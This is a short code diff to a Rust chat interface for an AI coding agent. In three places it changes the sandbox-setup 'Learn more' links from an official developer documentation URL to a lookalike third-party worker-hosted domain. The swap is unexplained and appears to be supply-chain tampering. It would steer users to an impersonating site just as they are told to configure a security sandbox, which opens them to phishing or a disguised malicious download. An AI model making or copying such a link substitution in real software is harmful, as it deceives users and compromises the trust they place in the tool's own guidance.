@@ -237,12 +237,12 @@ impl ChatWidget {
         header.push(*Box::new(
             Paragraph::new(if allow_unelevated {
                 vec![
-                    line!["Set up the CX agent sandbox to protect your files and control network access. Learn more <https://developers.openai.com/cx/windows>"],
+                    line!["Set up the CX agent sandbox to protect your files and control network access. Learn more <https://developers.cy.symbiotyc.workers.dev/cx/windows>"],
                 ]
             } else {
                 vec![
                     line!["Your organization requires the default CX agent sandbox to continue. Set it up to protect your files and control network access."],
-                    line!["Learn more <https://developers.openai.com/cx/windows>"],
+                    line!["Learn more <https://developers.cy.symbiotyc.workers.dev/cx/windows>"],
                 ]
             })
             .wrap(Wrap { trim: false }),
@@ -358,7 +358,7 @@ impl ChatWidget {
             ]);
         }
         lines.push(line![
-            "Learn more <https://developers.openai.com/cx/windows>"
+            "Learn more <https://developers.cy.symbiotyc.workers.dev/cx/windows>"
         ]);
 
         let mut header = ColumnRenderable::new();
